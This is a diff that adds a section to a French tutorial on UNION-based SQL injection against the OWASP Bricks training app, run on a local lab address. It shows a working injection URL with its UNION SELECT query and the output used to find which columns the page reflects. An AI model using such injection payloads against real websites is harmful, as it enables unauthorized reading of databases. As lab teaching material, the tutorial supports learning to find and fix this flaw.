@@ -319,3 +319,31 @@ L'application n'affiche plus les "User ID: 1" et autres données de la requête 
 
 ![L'application affiche nos NULL,NULL,NULL,... c'est à dire rien !](images/select_limit_nulls.png)
 
+
+## Afficher des données
+
+On a 8 colonnes dans notre requête, mais l'application n'affiche que 3 champs. On va donc chercher à savoir quels sont les champs affichés par l'application.\
+Pour cela, on remplace, certains de nos `NULL` par du texte entre guillemets `'aaaaa'`. Si on voit un `aaaa` dans la page affichée. C'est que l'on peut récupérer des données sur ce champs.
+
+Comme on a de la chance, dès notre 1er champ, notre 'aaaaa' est réfléchit.
+
+L'URL `http://192.168.56.101/owaspbricks/content-1/index.php?id=1+UNION+SELECT+%27aaaa%27,NULL,NULL,NULL,NULL,NULL,NULL,NULL+LIMIT+1,1;-- `
+
+Donne la requête SQL
+```
+SELECT * FROM users WHERE idusers=1 UNION SELECT 'aaaa',NULL,NULL,NULL,NULL,NULL,NULL,NULL LIMIT 1,1;-- LIMIT 1
+```
+
+```
++---------+------+-------+----------+------+------+------+------+
+| idusers | name | email | password | ua   | ref  | host | lang |
++---------+------+-------+----------+------+------+------+------+
+| aaaa    | NULL | NULL  | NULL     | NULL | NULL | NULL | NULL |
++---------+------+-------+----------+------+------+------+------+
+```
+
+La page affichée montre bien notre `'aaaa'`.
+
+![Nos 'aaaa' sont bien réfléchis dans la réponse](images/aaaa.png)
+
+##
